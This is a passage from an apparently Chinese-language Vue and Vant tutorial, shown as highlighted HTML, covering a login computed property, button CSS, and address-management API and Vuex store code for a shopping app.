#569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>并提供计算属性</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">isLogin</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">token</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>并引入对应 Empty 组件的 css 样式</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.bottom-button</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">160px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h2 id="地址管理"><a class="markdownIt-Anchor" href="#地址管理"></a> 地址管理</h2><blockquote><p>地址选择里面涉及到一个地区选择器，可以自行定义数据也可以使用官方的数据。可以参考：Vant 使用 <a href="https://blog.csdn.net/qq_51055690/article/details/126281265">Vant Area Data</a></p></blockquote><h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3><p>封装 api 接口：<code>api/address.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 获取地址列表</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/list"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 获取某个地址的详情</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getAddressDetail</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/detail"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">params:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">addressId:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 添加收货地址</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addAddress</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// console.log('api_dataObj', dataObj)</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 直接使用dataObj中的数据</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/add"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">form:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">phone:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phone</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">region:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">region</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">detail:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 更新收货地址</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">updateAddress</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 直接使用dataObj中的数据</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/edit"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">addressId:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">form:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">form</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 设置默认地址</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setDefaultAddress</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/setDefault"</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4"> });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 删除收货地址</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">deleteAddress</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/remove"</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4"> });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>Vuex 子模块：<code>store/modules/address.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getAddressList</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">updateAddress</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">deleteAddress</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getAddressDetail</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">addAddress</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">setDefaultAddress</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/address"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #6A9955">// import {Toast} from 'vant'</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">namespaced:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">state</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">AddressList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 初始化时从 localStorage 中获取默认地址 ID</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">defaultAddressId:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getItem</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"defaultAddressId"</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mutations:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 编辑地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">editAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">newAddress</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">AddressList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">newAddress</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 更新默认地址的 ID 并保存到 localStorage</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setDefaultAddressId</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setItem</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"defaultAddressId"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 保存到 localStorage</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">actions:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取地址列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">data</span><span style="color: #D4D4D4"> } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取某个地址的详情</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getAddressDetail</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">throw</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Error</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address ID is required"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('getAddressDetail被调用，addressId：', addressId)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">data</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getAddressDetail</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('getAddressDetail返回的数据：', data)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 添加地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"vuex_dataObj:"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">status</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 成功后，重新通过上面的actions方法拉取地址列表</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"getAddressList"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 设置默认地址(无用的接口，设置后拉取列表，其中不包含默认地址是否设置的状态)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setDefaultAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 发送请求</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setDefaultAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 成功后，重新拉取地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 更新地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">updateAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 发送更新请求</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">updateAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 更新之后，重新拉取地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 删除地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">deleteAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 发送删除请求</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">deleteAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">addressId</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 删除成功后，重新拉取地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getters:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取默认地址 ID（优先从 Vuex 中获取，否则从 localStorage 中获取）</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">getDefaultAddressId</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4"> || </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getItem</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"defaultAddressId"</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>Vuex 子模块 addressMap 处理引入的 vant 官方地区数据：<code>store/modules/addressMap.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">areaList</span><span style="color: #D4D4D4"> } </span><span style="color: 